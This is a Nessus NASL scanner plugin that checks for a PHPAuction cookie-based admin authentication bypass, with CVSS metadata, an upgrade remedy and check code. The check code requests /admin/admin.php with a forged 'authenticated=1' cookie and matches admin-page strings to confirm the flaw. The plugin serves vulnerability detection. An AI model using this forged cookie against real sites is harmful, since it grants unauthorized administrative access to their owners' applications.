#
# added by Tobias Glemser (tglemser@tele-consulting.com)
#
# thanks to George A. Theall and Dennis Jackson for helping
# writing this plugin
#
# SEE:http://www.securityfocus.com/bid/12069
#
# This script is released under the GNU GPLv2


include("compat.inc");

if(description)
{
 script_id(19239);
 script_bugtraq_id(12069);
 script_osvdb_id(12576);
 script_version ("$Revision: 1.13 $");

 name["english"] = "PHPAuction Admin Authentication Bypass";
 script_name(english:name["english"]);

 script_set_attribute(attribute:"synopsis", value:
"The remote PHP application is affected by an authentication bypass
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running PHPAuction, a web-based auction script
written in PHP. 

There is a flaw in the version of PHPAuction installed on the remote
host involving its handling of cookie-based authentication
credentials.  Using a specially crafted request, an unauthenticated,
remote attacker can gain administrative access to the affected
application." );
 # https://web.archive.org/web/20060513092443/http://pentest.tele-consulting.com/advisories/04_12_21_phpauction.txt
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?0082573a");
 script_set_attribute(attribute:"solution", value:
"Upgrade to a version > 2.0 of this software and/or restrict access
rights to the application's 'admin' directory using, say, a .htaccess
file." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/07/20");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/12/21");
 script_cvs_date("$Date: 2017/04/25 14:31:38 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:phpauction:phpauction");
script_end_attributes();

 summary["english"] = "Attempts to bypass PHPAuction administrative authentication";
 script_summary(english:summary["english"]);
 script_category(ACT_ATTACK);

 script_copyright(english:"(C) 2005-2017 Tobias Glemser (tglemser@tele-consulting.com)");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/PHP");
 exit(0);
}

# The script code starts here
include('global_settings.inc');
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
# Check if PHP is enabled
if(!can_host_php(port:port))exit(0);


if ( thorough_tests ) 
	dirs = list_uniq(make_list( "/phpauction", "/auction", "/auktion", cgi_dirs()));
else 
	dirs = cgi_dirs();

foreach dir (dirs)
{
  req = http_get(item:dir +"/admin/admin.php", port:port);
  idx = stridx(req, string("\r\n\r\n"));
  req = insstr(req, '\r\nCookie: authenticated=1;', idx, idx);
  res = http_keepalive_send_recv(port:port, data:req);
  #display("res='", res, "'.\n");
  if( res == NULL ) exit(0);

  if(
    (
      "TITLE>::PHPAUCTION ADMINISTRATION" >< res ||
      "PHPAUCTION.ORG" >< res
    ) &&
    (
      "settings.php" >< res || 
      "durations.php" >< res || 
      ("main.php" >< res && "<title>Administration</title>" >< res)
    )
  )
   {
    security_hole(port);
    exit(0);
   }
}
